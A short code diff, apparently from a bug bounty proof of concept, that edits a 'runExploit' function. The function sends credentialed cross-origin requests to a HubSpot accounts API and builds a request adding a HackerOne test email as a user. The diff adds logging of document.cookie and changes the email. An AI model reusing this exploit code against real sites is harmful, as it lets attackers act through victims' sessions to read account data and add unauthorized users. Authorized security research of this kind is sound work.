@@ -37,8 +37,9 @@
           })
         });
       }
-
+console.log("All cookies:", document.cookie);
 function runExploit() {
+  console.log("All cookies:", document.cookie);
   const xhr1 = new XMLHttpRequest();
   xhr1.open("GET", "https://app-eu1.hubspot.com/api/accounts/v1/basic-accounts/pinned", true);
   xhr1.withCredentials = true;
@@ -85,7 +86,7 @@ console.log(portalId)
       
 console.log("hello");
       const userData = {
-        users: [{ email: "dangerhm+4@wearehackerone.com" }],
+        users: [{ email: "dangerhm+3@wearehackerone.com" }],
         seatNames: ["service-professional-trial"],
         teamId: null,
         secondaryTeamIds: [],
